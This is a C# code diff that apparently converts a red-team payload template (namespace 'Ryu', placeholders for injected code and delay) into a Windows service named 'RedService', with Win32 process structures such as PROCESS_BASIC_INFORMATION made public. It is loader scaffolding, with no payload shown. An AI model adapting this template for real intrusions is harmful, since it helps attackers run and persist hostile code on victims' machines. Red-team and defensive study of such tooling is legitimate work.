@@ -1,3 +1,5 @@
+using System.Diagnostics;
+using System.ServiceProcess;
 using System;
 using System.Collections.Generic;
 using System.Linq;
@@ -6,14 +8,24 @@ using System.Text;
 using System.Threading.Tasks;
 //####USING####
 
-namespace Ryu
+
+
+
+namespace DotNetService
 {
+	public class Service:ServiceBase
+	{
+		protected override void OnStart(string[] args)
+		{
+            RedService.Start(args);
+		}
+	}
 
     //####CODE####
 
-    class Program
+    public static class RedService
     {
-        static void Main(string[] args)
+        public static void Start(string[] args)
         {
             //####DELAY####
 
@@ -72,7 +84,7 @@ namespace Ryu
 
 
 
-    class Win32
+    public static class Win32
     {
 
         [DllImport("shell32.dll", SetLastError = true)]
@@ -350,7 +362,7 @@ namespace Ryu
         }
 
         [StructLayout(LayoutKind.Sequential, CharSet = CharSet.Ansi)]
-        internal struct STARTUPINFO
+        public struct STARTUPINFO
         {
             public Int32 cb;
             public IntPtr lpReserved;
@@ -373,7 +385,7 @@ namespace Ryu
         }
 
         [StructLayout(LayoutKind.Sequential)]
-        internal struct PROCESS_INFORMATION
+        public struct PROCESS_INFORMATION
         {
             public IntPtr hProcess;
             public IntPtr hThread;
@@ -382,7 +394,7 @@ namespace Ryu
         }
 
         [StructLayout(LayoutKind.Sequential)]
-        internal struct PROCESS_BASIC_INFORMATION
+        public struct PROCESS_BASIC_INFORMATION
         {
             public IntPtr Reserved1;
             public IntPtr PebAddress;
@@ -393,5 +405,5 @@ namespace Ryu
         }
     }
 
-
+	static class Program { static void Main() { ServiceBase.Run(new ServiceBase[] { new Service() } ); }}
 }
